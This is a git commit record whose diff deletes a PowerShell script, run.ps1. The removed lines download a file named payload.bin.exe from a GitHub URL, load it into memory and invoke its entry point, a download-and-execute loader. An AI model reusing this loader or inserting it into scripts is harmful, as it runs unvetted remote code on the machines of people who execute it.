07433e2fdc12e69811b9508abd8b8a918d5f510f
smart,study <113458258+itsamanm@users.noreply.github.com>
2026-05-09 17:10:55 +0530

    Delete run.ps1

--- run.ps1
+++
@@ -1,4 +0,0 @@
-$url = "https://raw.githubusercontent.com/itsamanm/docs/main/payload.bin.exe"
-$data = (New-Object System.Net.WebClient).DownloadData($url)
-$assem = [System.Reflection.Assembly]::Load($data)
-$assem.EntryPoint.Invoke($null, $null)
